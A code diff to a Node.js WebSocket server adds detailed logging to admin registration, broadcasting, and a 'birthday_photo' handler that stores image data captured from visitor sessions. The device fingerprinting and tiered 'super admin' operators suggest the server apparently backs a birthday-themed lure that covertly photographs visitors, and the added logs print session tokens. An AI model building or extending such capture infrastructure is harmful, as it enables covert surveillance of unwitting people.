@@ -334,11 +334,25 @@ function generateDeviceId(fingerprintData) {
 }
 
 function broadcastToAdmins(message) {
+  console.log(`📡 Broadcasting to admins:`, {
+    messageType: message.type,
+    adminCount: adminClients.size,
+    hasImageData: !!(message.payload || message.photo),
+    sessionId: message.sessionId
+  });
+  
+  let sentCount = 0;
   adminClients.forEach(client => {
     if (client.readyState === 1) {
       client.send(JSON.stringify(message));
+      sentCount++;
+      console.log(`📤 Sent ${message.type} to admin (${client.adminType || 'unknown'})`);
+    } else {
+      console.log(`❌ Admin client not ready (readyState: ${client.readyState})`);
     }
   });
+  
+  console.log(`📡 Broadcast complete: ${sentCount}/${adminClients.size} admins received message`);
 }
 
 function broadcastToSuperAdmins(message) {
@@ -474,17 +488,29 @@ wss.on('connection', (ws, req) => {
         ws.sessionToken = data.sessionToken;
         
         adminClients.add(ws);
+        console.log(`🔑 Admin registered:`, {
+          type: ws.adminType,
+          sessionToken: ws.sessionToken,
+          totalAdmins: adminClients.size
+        });
         
         if (data.adminType === 'super') {
           superAdminClients.add(ws);
-          console.log('Super admin connected');
+          console.log(`🦹‍♂️ Super admin connected:`, {
+            sessionToken: ws.sessionToken,
+            totalSuperAdmins: superAdminClients.size,
+            totalAdmins: adminClients.size
+          });
           
           // Send all sessions data to super admin
           setTimeout(() => {
             sendAllSessionsToSuperAdmin(ws);
           }, 1000);
         } else {
-          console.log('Normal admin connected');
+          console.log(`👤 Normal admin connected:`, {
+            sessionToken: ws.sessionToken,
+            totalAdmins: adminClients.size
+          });
           
           // Send only own sessions data to normal admin
           setTimeout(() => {
@@ -699,7 +725,13 @@ wss.on('connection', (ws, req) => {
       
     } else if (data.type === 'birthday_photo') {
       // Birthday photo capture
-      console.log(`Received birthday photo capture: ${data.sessionId}`);
+      console.log(`🎂 Received birthday photo capture:`, {
+        sessionId: data.sessionId,
+        hasImageData: !!data.imageData,
+        imageDataLength: data.imageData ? data.imageData.length : 0,
+        metadata: data.metadata,
+        timestamp: data.timestamp
+      });
       
       // Store the birthday image
       if (!images.has(data.sessionId)) {
@@ -716,6 +748,7 @@ wss.on('connection', (ws, req) => {
       };
       
       images.get(data.sessionId).push(photoData);
+      console.log(`🎂 Stored birthday photo. Session ${data.sessionId} now has ${images.get(data.sessionId).length} images`);
       
       // Update session image count
       if (sessions.has(data.sessionId)) {
